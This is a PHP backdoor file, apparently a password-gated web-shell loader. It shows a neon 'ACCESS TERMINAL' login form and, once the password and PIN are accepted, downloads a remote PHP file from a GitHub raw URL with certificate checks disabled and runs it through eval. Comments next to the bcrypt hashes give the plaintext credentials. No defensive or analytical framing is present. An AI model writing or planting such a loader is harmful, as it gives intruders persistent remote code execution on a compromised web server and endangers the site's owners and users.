<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

session_start();
define('SECURE_ACCESS', true);
header('X-Powered-By: none');
header('Content-Type: text/html; charset=UTF-8');

$hashed_password = '$2a$12$l3GFlbhnLIEhFfquiOoq7eSjmOvge4FK3QWAC0KeTcpSq38Mos6VG'; // bcrypt dari 'rahasia123'
$hashed_pin = '$2a$12$o2exuQUURYZc2gSY9wdmKO1ZnNbWikpP3y7z7VOS4oUQTKm4Shx6e'; // bcrypt dari '246810'

function geturlsinfo($url) {
    if (function_exists('curl_exec')) {
        $conn = curl_init($url);
        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
        $data = curl_exec($conn);
        curl_close($conn);
        return $data;
    } elseif (function_exists('file_get_contents')) {
        return file_get_contents($url);
    }
    return false;
}

function is_logged_in() {
    return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
}

if (is_logged_in()) {
    $a = geturlsinfo('https://raw.githubusercontent.com/abyes-cyber/file/refs/heads/main/jumper-no-password.php');
    if ($a === false) {
        die("Gagal mendapatkan konten dari URL.");
    }
    // Debug tampilkan dulu isi $a jika perlu
    // echo "<pre>" . htmlspecialchars($a) . "</pre>"; exit;
    eval('?>' . $a);
} else {
    $error = '';
    if (isset($_POST['password']) && isset($_POST['pin'])) {
        $entered_password = $_POST['password'];
        $entered_pin = $_POST['pin'];

        if (password_verify($entered_password, $hashed_password) && password_verify($entered_pin, $hashed_pin)) {
            $_SESSION['logged_in'] = true;
            header("Location: " . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $error = "Password atau PIN salah!";
        }
    }
    ?>
<!DOCTYPE html>
<html lang="en">
<head>
<title>Secure Auth</title>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
@import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap');

* { margin: 0; padding: 0; box-sizing: border-box; }

body {
height: 100vh;
background: linear-gradient(135deg, #0c0c0c 0%, #1a0033 50%, #0f0f23 100%);
display: flex;
justify-content: center;
align-items: center;
font-family: 'Orbitron', monospace;
overflow: hidden;
position: relative;
}

body::before {
content: '';
position: absolute;
top: 0; left: 0; right: 0; bottom: 0;
background:
radial-gradient(circle at 20% 80%, rgba(120, 119, 198, 0.3) 0%, transparent 50%),
radial-gradient(circle at 80% 20%, rgba(255, 120, 120, 0.3) 0%, transparent 50%),
radial-gradient(circle at 40% 40%, rgba(120, 219, 255, 0.2) 0%, transparent 50%);
animation: pulse 4s ease-in-out infinite alternate;
}

@keyframes pulse {
0% { opacity: 0.5; transform: scale(1); }
100% { opacity: 0.8; transform: scale(1.05); }
}

.container {
width: 360px;
padding: 50px 40px;
background: rgba(10, 10, 20, 0.85);
backdrop-filter: blur(20px);
border-radius: 20px;
box-shadow:
0 25px 45px rgba(0, 0, 0, 0.8),
inset 0 1px 0 rgba(255, 255, 255, 0.1);
border: 1px solid rgba(0, 255, 255, 0.2);
text-align: center;
position: relative;
overflow: hidden;
}

.container::before {
content: '';
position: absolute;
top: -50%; left: -50%;
width: 200%; height: 200%;
background: conic-gradient(transparent, rgba(0, 255, 255, 0.1), transparent);
animation: rotate 6s linear infinite;
}

@keyframes rotate {
100% { transform: rotate(360deg); }
}

h2 {
font-size: 2.2em;
font-weight: 900;
background: linear-gradient(45deg, #00ffff, #ff00ff, #00ff88);
-webkit-background-clip: text;
-webkit-text-fill-color: transparent;
background-clip: text;
margin-bottom: 40px;
text-shadow: 0 0 30px rgba(0, 255, 255, 0.5);
animation: glitch 2s infinite;
}

@keyframes glitch {
0%, 100% { transform: translate(0); }
20% { transform: translate(-2px, 2px); }
40% { transform: translate(-2px, -2px); }
60% { transform: translate(2px, 2px); }
80% { transform: translate(2px, -2px); }
}

input {
width: 100%;
padding: 16px 20px;
margin: 20px 0;
border-radius: 12px;
border: 1px solid rgba(0, 255, 255, 0.3);
background: rgba(0, 0, 0, 0.7);
backdrop-filter: blur(10px);
color: #fff;
font-family: 'Orbitron', monospace;
font-size: 1rem;
transition: all 0.3s ease;
box-shadow: inset 0 2px 10px rgba(0, 0, 0, 0.5);
}

input:focus {
outline: none;
border-color: #00ffff;
box-shadow: 0 0 25px rgba(0, 255, 255, 0.5), inset 0 2px 10px rgba(0, 255, 255, 0.1);
transform: scale(1.02);
}

input::placeholder {
color: rgba(255, 255, 255, 0.5);
}

button {
width: 100%;
padding: 16px;
background: linear-gradient(45deg, #00ffff, #0080ff);
border: none;
border-radius: 12px;
color: #000;
font-weight: 700;
font-family: 'Orbitron', monospace;
font-size: 1.1rem;
cursor: pointer;
transition: all 0.3s ease;
text-transform: uppercase;
letter-spacing: 1px;
position: relative;
overflow: hidden;
}

button::before {
content: '';
position: absolute;
top: 0; left: -100%;
width: 100%; height: 100%;
background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.4), transparent);
transition: left 0.5s;
}

button:hover::before {
left: 100%;
}

button:hover {
transform: translateY(-2px);
box-shadow: 0 15px 35px rgba(0, 255, 255, 0.4);
}

.error {
background: rgba(255, 0, 0, 0.2);
color: #ff4444;
padding: 12px;
border-radius: 8px;
border: 1px solid rgba(255, 0, 0, 0.5);
margin-bottom: 20px;
animation: shake 0.5s ease-in-out;
box-shadow: 0 0 15px rgba(255, 0, 0, 0.3);
}

@keyframes shake {
0%, 100% { transform: translateX(0); }
25% { transform: translateX(-5px); }
75% { transform: translateX(5px); }
}

@media (max-width: 480px) {
.container { width: 90%; padding: 40px 30px; }
h2 { font-size: 1.8em; }
}
</style>
</head>
<body>
<div class="container">
<h2>ACCESS TERMINAL</h2>
<?php if (!empty($error)) echo "<div class='error'>$error</div>"; ?>
<form method="post">
<input type="password" name="password" placeholder="Enter Password" required />
<input type="password" name="pin" placeholder="Enter PIN" maxlength="6" required />
<button type="submit">AUTHORIZE ACCESS</button>
</form>
</div>
</body>
</html>
    <?php
}
?>
